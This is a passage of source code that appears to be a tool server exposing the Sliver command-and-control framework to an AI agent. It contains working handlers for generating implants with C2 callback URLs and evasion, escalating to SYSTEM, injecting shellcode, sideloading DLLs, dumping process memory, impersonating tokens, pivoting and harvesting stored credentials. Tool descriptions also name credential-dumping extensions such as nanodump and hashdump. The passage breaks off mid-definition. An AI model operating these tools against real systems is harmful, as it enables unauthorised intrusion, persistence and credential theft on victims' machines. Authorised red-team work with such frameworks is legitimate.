        beacons = await client.beacons()
        now = int(_time.time())
        pruned = []
        for b in beacons:
            nc = b.NextCheckin
            if hasattr(nc, 'seconds'):
                nc_ts = nc.seconds
            elif hasattr(nc, 'timestamp'):
                nc_ts = int(nc.timestamp())
            else:
                nc_ts = int(nc) if nc else 0
            if nc_ts < now:
                await client.kill_beacon(b.ID)
                pruned.append({"id": b.ID, "name": b.Name, "hostname": b.Hostname})
        return {"pruned": pruned, "count": len(pruned)}

    elif command == "generate_implant":
        import os as _os
        from sliver.pb.clientpb import client_pb2 as _client_pb2gen
        is_beacon = params.get("is_beacon", True)
        goos = params.get("goos", "windows")
        goarch = params.get("goarch", "amd64")
        c2_urls = params.get("c2", [])
        format_str = params.get("format", "EXECUTABLE")
        name = params.get("name", "")
        save_path = params.get("save_path")
        beacon_interval = int(params.get("beacon_interval", 60))
        beacon_jitter = int(params.get("beacon_jitter", 30))
        evasion = params.get("evasion", False)

        if not c2_urls or not save_path:
            return {"error": "c2 (list of URLs) and save_path required"}

        format_map = {"EXECUTABLE": 0, "SHARED_LIB": 1, "SHELLCODE": 2, "SERVICE": 3}
        fmt = format_map.get(format_str.upper(), 0)

        cfg = _client_pb2gen.ImplantConfig(
            IsBeacon=is_beacon,
            GOOS=goos,
            GOARCH=goarch,
            Format=fmt,
            Name=name,
            Evasion=evasion,
            BeaconInterval=int(beacon_interval * 1_000_000_000),
            BeaconJitter=int(beacon_jitter * 1_000_000_000),
            C2=[_client_pb2gen.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)],
        )

        gen = await client.generate_implant(cfg, timeout=600)
        _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
        with open(save_path, 'wb') as _f:
            _f.write(gen.File.Data)

        return {
            "success": True,
            "save_path": save_path,
            "size": len(gen.File.Data),
            "name": gen.File.Name,
            "goos": goos, "goarch": goarch,
            "is_beacon": is_beacon, "format": format_str
        }

    # ── Terminate ──────────────────────────────────────────────────────────
    elif command == "session_terminate":
        session_id = params.get("session_id")
        pid = int(params.get("pid", 0))
        force = params.get("force", False)
        if not session_id or not pid:
            return {"error": "session_id and pid required"}
        interact = await client.interact_session(session_id)
        r = await interact.terminate(pid, force=force)
        return {"success": True, "pid": r.Pid}

    elif command == "beacon_terminate":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2t
        beacon_id = params.get("beacon_id")
        pid = int(params.get("pid", 0))
        force = params.get("force", False)
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not pid:
            return {"error": "beacon_id and pid required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.terminate(pid, force=force)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2t.Terminate()
                    r.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "pid": r.Pid}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Process Dump ───────────────────────────────────────────────────────
    elif command == "session_process_dump":
        import os as _os
        session_id = params.get("session_id")
        pid = int(params.get("pid", 0))
        save_path = params.get("save_path", "/tmp/procdump.bin")
        if not session_id or not pid:
            return {"error": "session_id and pid required"}
        interact = await client.interact_session(session_id)
        r = await interact.process_dump(pid)
        if r.Data:
            _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
            with open(save_path, 'wb') as _f:
                _f.write(r.Data)
        return {"success": True, "save_path": save_path, "size": len(r.Data) if r.Data else 0}

    elif command == "beacon_process_dump":
        import time as _time, os as _os
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2pd
        beacon_id = params.get("beacon_id")
        pid = int(params.get("pid", 0))
        save_path = params.get("save_path", "/tmp/procdump.bin")
        timeout_secs = int(params.get("timeout", 300))
        if not beacon_id or not pid:
            return {"error": "beacon_id and pid required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.process_dump(pid)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2pd.ProcessDump()
                    r.ParseFromString(tc.Response)
                    if r.Data:
                        _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
                        with open(save_path, 'wb') as _f:
                            _f.write(r.Data)
                    return {"success": True, "task_id": task_id, "save_path": save_path, "size": len(r.Data) if r.Data else 0}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Get System (privesc → SYSTEM) ──────────────────────────────────────
    elif command == "session_get_system":
        from sliver.pb.clientpb import client_pb2 as _client_pb2gs
        session_id = params.get("session_id")
        hosting_process = params.get("hosting_process", "spoolsv.exe")
        c2_urls = params.get("c2", [])
        if not session_id or not c2_urls:
            return {"error": "session_id and c2 (list) required"}
        cfg = _client_pb2gs.ImplantConfig(
            IsBeacon=False, GOOS="windows", GOARCH="amd64",
            C2=[_client_pb2gs.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)]
        )
        interact = await client.interact_session(session_id)
        r = await interact.get_system(hosting_process, cfg)
        return {"success": True, "session_id": session_id}

    elif command == "beacon_get_system":
        import time as _time
        from sliver.pb.clientpb import client_pb2 as _client_pb2bgs
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bgs
        beacon_id = params.get("beacon_id")
        hosting_process = params.get("hosting_process", "spoolsv.exe")
        c2_urls = params.get("c2", [])
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not c2_urls:
            return {"error": "beacon_id and c2 (list) required"}
        cfg = _client_pb2bgs.ImplantConfig(
            IsBeacon=False, GOOS="windows", GOARCH="amd64",
            C2=[_client_pb2bgs.ImplantC2(URL=url, Priority=i) for i, url in enumerate(c2_urls)]
        )
        interact = await client.interact_beacon(beacon_id)
        task = await interact.get_system(hosting_process, cfg)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2bgs.GetSystem()
                    r.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Execute Shellcode ──────────────────────────────────────────────────
    elif command == "session_execute_shellcode":
        import base64 as _b64
        session_id = params.get("session_id")
        shellcode_b64 = params.get("shellcode_b64")
        shellcode_path = params.get("shellcode_path")
        pid = int(params.get("pid", 0))
        rwx = params.get("rwx", False)
        if not session_id or (not shellcode_b64 and not shellcode_path):
            return {"error": "session_id and shellcode_b64 or shellcode_path required"}
        if shellcode_path:
            with open(shellcode_path, 'rb') as _f:
                data = _f.read()
        else:
            data = _b64.b64decode(shellcode_b64)
        interact = await client.interact_session(session_id)
        r = await interact.execute_shellcode(data, rwx, pid)
        return {"success": True}

    elif command == "beacon_execute_shellcode":
        import time as _time, base64 as _b64
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2sc
        beacon_id = params.get("beacon_id")
        shellcode_b64 = params.get("shellcode_b64")
        shellcode_path = params.get("shellcode_path")
        pid = int(params.get("pid", 0))
        rwx = params.get("rwx", False)
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or (not shellcode_b64 and not shellcode_path):
            return {"error": "beacon_id and shellcode_b64 or shellcode_path required"}
        if shellcode_path:
            with open(shellcode_path, 'rb') as _f:
                data = _f.read()
        else:
            data = _b64.b64decode(shellcode_b64)
        interact = await client.interact_beacon(beacon_id)
        task = await interact.execute_shellcode(data, rwx, pid)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    return {"success": True, "task_id": task_id}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Sideload ───────────────────────────────────────────────────────────
    elif command == "session_sideload":
        session_id = params.get("session_id")
        lib_path = params.get("lib_path")
        process_name = params.get("process_name", "notepad.exe")
        arguments = params.get("arguments", "")
        entry_point = params.get("entry_point", "")
        kill = params.get("kill", True)
        if not session_id or not lib_path:
            return {"error": "session_id and lib_path required"}
        with open(lib_path, 'rb') as _f:
            data = _f.read()
        interact = await client.interact_session(session_id)
        r = await interact.sideload(data, process_name, arguments, entry_point, kill)
        return {"success": True, "result": r.Result.decode('utf-8', errors='replace') if r.Result else ""}

    elif command == "beacon_sideload":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2sl
        beacon_id = params.get("beacon_id")
        lib_path = params.get("lib_path")
        process_name = params.get("process_name", "notepad.exe")
        arguments = params.get("arguments", "")
        entry_point = params.get("entry_point", "")
        kill = params.get("kill", True)
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not lib_path:
            return {"error": "beacon_id and lib_path required"}
        with open(lib_path, 'rb') as _f:
            data = _f.read()
        interact = await client.interact_beacon(beacon_id)
        task = await interact.sideload(data, process_name, arguments, entry_point, kill)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2sl.Sideload()
                    r.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "result": r.Result.decode('utf-8', errors='replace') if r.Result else ""}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Env Vars ───────────────────────────────────────────────────────────
    elif command == "session_get_env":
        session_id = params.get("session_id")
        name = params.get("name", "")
        if not session_id:
            return {"error": "session_id required"}
        interact = await client.interact_session(session_id)
        r = await interact.get_env(name)
        return {"variables": {v.Key: v.Value for v in r.Variables}}

    elif command == "session_set_env":
        session_id = params.get("session_id")
        name = params.get("name")
        value = params.get("value", "")
        if not session_id or not name:
            return {"error": "session_id and name required"}
        interact = await client.interact_session(session_id)
        await interact.set_env(name, value)
        return {"success": True, "name": name, "value": value}

    elif command == "beacon_get_env":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2env
        beacon_id = params.get("beacon_id")
        name = params.get("name", "")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.get_env(name)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2env.EnvInfo()
                    r.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "variables": {v.Key: v.Value for v in r.Variables}}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Token Ops ──────────────────────────────────────────────────────────
    elif command == "session_impersonate":
        session_id = params.get("session_id")
        username = params.get("username")
        if not session_id or not username:
            return {"error": "session_id and username required"}
        interact = await client.interact_session(session_id)
        r = await interact.impersonate(username)
        return {"success": True}

    elif command == "session_make_token":
        session_id = params.get("session_id")
        username = params.get("username")
        password = params.get("password")
        domain = params.get("domain", "")
        if not session_id or not username or not password:
            return {"error": "session_id, username, password required"}
        interact = await client.interact_session(session_id)
        r = await interact.make_token(username, password, domain)
        return {"success": True}

    elif command == "session_revert_to_self":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        interact = await client.interact_session(session_id)
        await interact.revert_to_self()
        return {"success": True}

    # ── Beacon File Ops (async parity) ─────────────────────────────────────
    elif command == "beacon_cd":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bcd
        beacon_id = params.get("beacon_id")
        path = params.get("path")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not path:
            return {"error": "beacon_id and path required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.cd(path)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2bcd.Pwd()
                    r.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "path": r.Path}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_pwd":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bpwd
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.pwd()
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    r = _sliver_pb2bpwd.Pwd()
                    r.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "path": r.Path}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_mkdir":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bmk
        beacon_id = params.get("beacon_id")
        path = params.get("path")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not path:
            return {"error": "beacon_id and path required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.mkdir(path)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    return {"success": True, "task_id": task_id, "path": path}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_file_rm":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2brm
        beacon_id = params.get("beacon_id")
        path = params.get("path")
        recursive = params.get("recursive", False)
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not path:
            return {"error": "beacon_id and path required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.rm(path, recursive=recursive)
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    return {"success": True, "task_id": task_id, "path": path}
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_netstat":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2bns
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}
        interact = await client.interact_beacon(beacon_id)
        task = await interact.netstat()
        task_id = task.ID
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ns = _sliver_pb2bns.Netstat()
                    ns.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "entries": [{"local": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port}, "remote": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None, "protocol": e.Protocol, "state": e.SkState, "pid": e.Pid} for e in ns.Entries[:50]]
                    }
            except Exception: pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    # ── Windows Services ───────────────────────────────────────────────────
    elif command == "session_start_service":
        session_id = params.get("session_id")
        name = params.get("name")
        description = params.get("description", "")
        exe = params.get("exe")
        hostname = params.get("hostname", "")
        arguments = params.get("arguments", "")
        if not session_id or not name or not exe:
            return {"error": "session_id, name, exe required"}
        interact = await client.interact_session(session_id)
        r = await interact.start_service(name, description, exe, hostname, arguments)
        return {"success": True, "name": name}

    elif command == "session_stop_service":
        session_id = params.get("session_id")
        name = params.get("name")
        hostname = params.get("hostname", "")
        if not session_id or not name:
            return {"error": "session_id and name required"}
        interact = await client.interact_session(session_id)
        await interact.stop_service(name, hostname)
        return {"success": True, "name": name}

    # ── Client Utility ─────────────────────────────────────────────────────
    elif command == "rename_session":
        session_id = params.get("session_id")
        name = params.get("name")
        if not session_id or not name:
            return {"error": "session_id and name required"}
        await client.rename_session(session_id, name)
        return {"success": True, "session_id": session_id, "name": name}

    elif command == "delete_implant_build":
        implant_name = params.get("name")
        if not implant_name:
            return {"error": "name required"}
        await client.delete_implant_build(implant_name)
        return {"success": True, "name": implant_name}

    # Pivot commands
    elif command == "pivot_listeners":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pivots = await interact.list_pivots()
        return [{
            "id": p.ID,
            "type": str(p.Type),
            "bind_address": p.BindAddress
        } for p in pivots]

    elif command == "pivot_start_tcp":
        session_id = params.get("session_id")
        port = params.get("port", 9898)
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pivot = await interact.start_tcp_pivot(port)
        return {
            "id": pivot.ID,
            "bind_address": pivot.BindAddress,
            "type": "TCP"
        }

    # Credentials
    elif command == "creds":
        creds = await client.creds()
        return [{
            "id": c.ID,
            "username": c.Username,
            "plaintext": c.Plaintext,
            "hash": c.Hash,
            "hash_type": str(c.HashType),
            "hostname": c.Hostname,
            "origin": str(c.Origin.Type) if c.Origin else None
        } for c in creds.Credentials]

    # Hosts
    elif command == "hosts":
        hosts = await client.hosts()
        return [{
            "id": h.HostUUID,
            "hostname": h.Hostname,
            "os": h.OSVersion,
            "ioc_count": len(h.IOCs) if h.IOCs else 0
        } for h in hosts.Hosts]

    else:
        return {"error": f"Unknown command: {command}"}

asyncio.run(main())
`;

    const python = spawn(config.pythonPath, ["-c", pythonScript], {
      timeout: config.timeout,
    });

    let stdout = "";
    let stderr = "";

    python.stdout.on("data", (data: Buffer) => {
      stdout += data.toString();
    });

    python.stderr.on("data", (data: Buffer) => {
      stderr += data.toString();
    });

    python.on("close", (code: number | null) => {
      if (code !== 0 && !stdout) {
        reject(new Error(`Python process exited with code ${code}: ${stderr}`));
        return;
      }

      try {
        // Find the JSON in stdout (may have extra output)
        const jsonMatch = stdout.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const result = JSON.parse(jsonMatch[0]);
          if (result.error) {
            reject(new Error(result.error));
          } else {
            resolve(result.data);
          }
        } else {
          reject(new Error(`No JSON in output: ${stdout}`));
        }
      } catch (e) {
        reject(new Error(`Failed to parse output: ${stdout}\nError: ${e}`));
      }
    });

    python.on("error", (err: Error) => {
      reject(err);
    });
  });
}

// Tool definitions
const SLIVER_TOOLS: Tool[] = [
  // Server info
  {
    name: "sliver_version",
    description: "Get Sliver server version information",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_operators",
    description: "List all connected operators",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Sessions
  {
    name: "sliver_sessions",
    description:
      "List all active sessions (real-time implant connections)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_kill_session",
    description: "Kill/terminate a session",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID to kill",
        },
      },
      required: ["session_id"],
    },
  },

  // Beacons
  {
    name: "sliver_beacons",
    description:
      "List all beacons (asynchronous callback implants)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Listeners/Jobs
  {
    name: "sliver_listeners",
    description: "List all active listeners/jobs",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_start_mtls",
    description: "Start an mTLS (mutual TLS) listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 8888)",
          default: 8888,
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_https",
    description: "Start an HTTPS listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 443)",
          default: 443,
        },
        domain: {
          type: "string",
          description: "Domain for the listener",
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_http",
    description: "Start an HTTP listener",
    inputSchema: {
      type: "object",
      properties: {
        host: {
          type: "string",
          description: "Host to bind to (default: 0.0.0.0)",
          default: "0.0.0.0",
        },
        port: {
          type: "number",
          description: "Port to listen on (default: 80)",
          default: 80,
        },
        domain: {
          type: "string",
          description: "Domain for the listener",
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_start_dns",
    description: "Start a DNS listener",
    inputSchema: {
      type: "object",
      properties: {
        domains: {
          type: "array",
          items: { type: "string" },
          description: "Domains for DNS C2",
        },
      },
      required: ["domains"],
    },
  },
  {
    name: "sliver_start_wg",
    description: "Start a WireGuard listener",
    inputSchema: {
      type: "object",
      properties: {
        port: {
          type: "number",
          description: "Port to listen on (default: 53)",
          default: 53,
        },
      },
      required: [],
    },
  },
  {
    name: "sliver_kill_listener",
    description: "Stop/kill a listener job",
    inputSchema: {
      type: "object",
      properties: {
        job_id: {
          type: "number",
          description: "Job ID to kill",
        },
      },
      required: ["job_id"],
    },
  },

  // Implant builds
  {
    name: "sliver_implant_builds",
    description: "List all implant builds",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "sliver_implant_profiles",
    description: "List all implant generation profiles",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },

  // Session file operations
  {
    name: "sliver_ls",
    description: "List files on target (session)",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to list (default: current directory)",
          default: ".",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_pwd",
    description: "Get current working directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_cd",
    description: "Change directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to change to",
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_mkdir",
    description: "Create directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Directory path to create",
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_rm",
    description: "Remove file or directory on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        path: {
          type: "string",
          description: "Path to remove",
        },
        recursive: {
          type: "boolean",
          description: "Remove recursively",
          default: false,
        },
      },
      required: ["session_id", "path"],
    },
  },
  {
    name: "sliver_download",
    description: "Download file from target (session). Provide local_path to save to disk.",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        remote_path: {
          type: "string",
          description: "Remote path to download",
        },
        local_path: {
          type: "string",
          description: "Local path to save file (e.g. /tmp/output.dat). Leave empty to get size only.",
        },
      },
      required: ["session_id", "remote_path"],
    },
  },
  {
    name: "sliver_upload",
    description: "Upload file to target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        local_path: {
          type: "string",
          description: "Local file path",
        },
        remote_path: {
          type: "string",
          description: "Remote destination path",
        },
      },
      required: ["session_id", "local_path", "remote_path"],
    },
  },

  // Command execution
  {
    name: "sliver_execute",
    description: "Execute a program on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        exe: {
          type: "string",
          description: "Executable path",
        },
        args: {
          type: "array",
          items: { type: "string" },
          description: "Arguments",
          default: [],
        },
        output: {
          type: "boolean",
          description: "Capture output",
          default: true,
        },
      },
      required: ["session_id", "exe"],
    },
  },
  {
    name: "sliver_shell",
    description: "Execute a shell command on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        command: {
          type: "string",
          description: "Shell command to execute",
        },
      },
      required: ["session_id", "command"],
    },
  },

  // System enumeration
  {
    name: "sliver_ps",
    description: "List processes on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_ifconfig",
    description: "Get network interfaces on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_netstat",
    description: "Get network connections on target",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_screenshot",
    description: "Take a screenshot on target (session), saves PNG to disk",
    inputSchema: {
      type: "object",
      properties: {
        session_id: {
          type: "string",
          description: "Session ID",
        },
        save_path: {
          type: "string",
          description: "Local path to save PNG (default: /tmp/session_screenshot.png)",
          default: "/tmp/session_screenshot.png",
        },
      },
      required: ["session_id"],
    },
  },
  {
    name: "sliver_beacon_execute_bof",
    description: "DEPRECATED — execute_bof tidak didukung sliver-py. Gunakan sliver_beacon_call_extension untuk armory tools.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_call_extension",
    description: "Call an installed armory extension on a beacon (async). Armory tools: nanodump, Seatbelt, SharpUp, hashdump, etc. Install first with 'armory install <name>' in Sliver console.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        extension_name: { type: "string", description: "Extension name as installed (e.g. 'nanodump', 'Seatbelt', 'hashdump')" },
        args_b64: { type: "string", description: "Arguments as base64-encoded bytes (empty for no args)", default: "" },
        export_name: { type: "string", description: "DLL export to call (usually empty for default)", default: "" },
        save_path: { type: "string", description: "Local path to save binary output (e.g. /tmp/nanodump.dmp). Leave empty for text output." },
        timeout: { type: "number", description: "Seconds to wait for beacon check-in (default: 180)", default: 180 },
      },
      required: ["beacon_id", "extension_name"],
    },
  },
  {
    name: "sliver_beacon_open_session",
    description: "Open an interactive session from a beacon (queues OpenSession task, polls until session appears). Session must be closed after use.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: {
          type: "string",
          description: "Beacon ID to open session from",
        },
        timeout: {
          type: "number",
          description: "Seconds to wait for beacon to check in (default: 120)",
          default: 120,
        },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_rm",
    description: "Remove/delete a dead beacon from Sliver server. Does not kill remote process.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: {
          type: "string",
          description: "Beacon ID to remove",
        },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_execute",
    description: "Execute a command on a beacon (async, waits for check-in). Use instead of session_execute for beacon targets.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        exe: { type: "string", description: "Executable to run (e.g. powershell.exe, cmd.exe)" },
        args: {
          type: "array",
          items: { type: "string" },
          description: "Arguments list",
          default: [],
        },
        output: { type: "boolean", description: "Capture output (default: true)", default: true },
        timeout: { type: "number", description: "Seconds to wait for beacon check-in (default: 120)", default: 120 },
      },
      required: ["beacon_id", "exe"],
    },
  },
  {
    name: "sliver_beacon_upload",
    description: "Upload a file to a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        local_path: { type: "string", description: "Local file path to upload" },
        remote_path: { type: "string", description: "Remote destination path on target" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "local_path", "remote_path"],
    },
  },
  {
    name: "sliver_beacon_screenshot",
    description: "Take a screenshot on a beacon target (async, waits for check-in). Saves PNG to disk.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        save_path: { type: "string", description: "Local path to save PNG (default: /tmp/beacon_screenshot.png)", default: "/tmp/beacon_screenshot.png" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_download",
    description: "Download a file from a beacon target (async, waits for check-in). Provide local_path to save to disk.",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        remote_path: { type: "string", description: "Remote file path on target" },
        local_path: { type: "string", description: "Local path to save file (e.g. /tmp/output.dat)" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id", "remote_path"],
    },
  },
  {
    name: "sliver_beacon_ls",
    description: "List files on a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        path: { type: "string", description: "Path to list (default: .)", default: "." },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_ps",
    description: "List processes on a beacon target (async, waits for check-in).",
    inputSchema: {
      type: "object",
      properties: {
        beacon_id: { type: "string", description: "Beacon ID" },
        timeout: { type: "number", description: "Seconds to wait (default: 120)", default: 120 },
      },
      required: ["beacon_id"],
    },
  },
  {
    name: "sliver_beacon_ifconfig",
